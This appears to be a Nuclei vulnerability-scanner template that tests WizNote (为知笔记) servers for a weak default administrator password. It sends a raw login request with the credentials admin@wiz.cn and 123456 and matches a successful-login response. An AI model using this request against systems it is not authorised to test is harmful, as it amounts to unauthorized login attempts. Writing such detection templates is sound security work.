id: weizhibiji-login-Weak-password

info:
  name: 为知笔记 login 弱口令漏洞
  author: weizhibiji
  severity: high
  tags: Weak password

http:
  - raw:
      - |
        POST /as/user/login?clientType=web&clientVersion=4.0&lang=zh-cn HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"userId":"admin@wiz.cn","password":"123456","autoLogin":true,"domain":"","deviceId":null}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{"returnCode":200'
          - '"returnMessage":"OK"'
        condition: and
      - type: status
        status: 
        - 200